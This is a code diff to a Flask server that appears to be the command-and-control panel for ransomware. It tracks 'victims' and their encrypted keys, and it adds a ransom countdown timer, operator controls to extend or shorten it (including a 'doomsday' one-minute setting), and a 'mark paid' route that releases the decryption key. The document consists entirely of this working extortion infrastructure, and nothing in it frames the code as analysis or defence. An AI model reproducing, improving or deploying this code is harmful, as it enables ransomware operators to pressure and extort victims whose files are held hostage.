@@ -144,27 +144,65 @@ def checkin():
         "encrypted_key": encrypted_aes_key_b64,
         "decrypted_key": None,
         "first_seen": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        "checkin_time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
+        "timer": 72 * 3600 # Default 72 hours
     }
     print(f"[+] New victim check-in: {victim_id}")
     return jsonify({"victim_id": victim_id})
 
 @app.route('/api/status/<victim_id>', methods=['GET'])
 def get_status(victim_id):
-    data = victims.get(victim_id)
-    if not data:
-        return jsonify({"status": "error", "message": "Victim not found"}), 404
+    if victim_id not in victims:
+        return jsonify({"status": "unknown"}), 404
+    
+    # Sync timer if provided
+    current_time_left = request.args.get('time_left', type=int)
+    if current_time_left is not None:
+        # Update our record, unless we have a pending override
+        if 'pending_timer_update' not in victims[victim_id]:
+            victims[victim_id]['timer'] = current_time_left
 
-    if data['status'] == 'KEY_SENT' and data['decrypted_key']:
-        # Direct key delivery
-        return jsonify({"status": "ready", "key": data['decrypted_key']})
+    response = {"status": "waiting"}
+    
+    # Check for direct key delivery
+    if victims[victim_id]['status'] == 'KEY_SENT' and victims[victim_id].get('decrypted_key'):
+        response["status"] = "ready"
+        response["key"] = victims[victim_id]['decrypted_key']
+    
+    # Check for timer override
+    if 'pending_timer_update' in victims[victim_id]:
+        response["new_timer"] = victims[victim_id]['pending_timer_update']
+        del victims[victim_id]['pending_timer_update'] # Clear after sending
+        
+    return jsonify(response)
+
+@app.route('/api/timer/<victim_id>/<action>')
+def update_timer(victim_id, action):
+    if victim_id not in victims:
+        return "Unknown victim", 404
+    
+    current_timer = victims[victim_id].get('timer', 72*3600)
+    
+    if action == 'add_1h':
+        new_time = current_timer + 3600
+    elif action == 'sub_1h':
+        new_time = max(0, current_timer - 3600)
+    elif action == 'reset':
+        new_time = 72 * 3600
+    elif action == 'doomsday':
+        new_time = 60 # 1 minute left!
     else:
-        return jsonify({"status": "waiting"})
+        return "Invalid action", 400
+        
+    victims[victim_id]['timer'] = new_time
+    victims[victim_id]['pending_timer_update'] = new_time
+    return redirect(url_for('home'))
 
-@app.route('/mark_paid/<victim_id>', methods=['POST'])
+@app.route('/mark_paid/<victim_id>', methods=['POST', 'GET']) # Added GET for direct link from dashboard
 def mark_as_paid(victim_id):
     victim_data = victims.get(victim_id)
     if not victim_data or victim_data['status'] != 'UNPAID':
-        return redirect('/')
+        return redirect(url_for('home'))
 
     print(f"[*] Marking victim {victim_id} as paid. Decrypting key...")
     encrypted_aes_key_b64 = victim_data['encrypted_key']
@@ -190,7 +228,7 @@ def mark_as_paid(victim_id):
         print(f"[-] Error decrypting key for {victim_id}: {e}")
         victims[victim_id]['status'] = 'ERROR'
 
-    return redirect('/')
+    return redirect(url_for('home'))
 
 if __name__ == '__main__':
     print("\n" + "="*50)
